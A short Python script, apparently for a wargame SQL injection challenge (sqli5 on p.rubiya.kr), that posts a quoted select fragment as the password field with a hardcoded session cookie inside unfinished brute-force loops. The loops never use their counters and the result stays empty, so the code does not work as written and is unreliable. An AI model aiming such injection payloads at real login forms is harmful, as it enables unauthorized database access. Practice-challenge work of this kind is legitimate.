import requests

def my_request(upw):
	url = "https://p.rubiya.kr/sqli5/?join=1"
	cookie = {'PHPSESSID':'hrbclhgakts2hofqalha070n75'}
	params = {
		'jid':'jamb',
		'jpw':upw
	}
	print(url)
	print(params)
	response = requests.post(url,data=params,cookies=cookie)
	print(response.text)
	return response

def solve():
	cnt = 1
	res = ""
	for num in range(1,10):
		cnt += 1
		for ch in range(33,255):
			upw = f"'(select(1))"
			response = my_request(upw)

	print("I got :",res)

if __name__ == "__main__":
	solve()
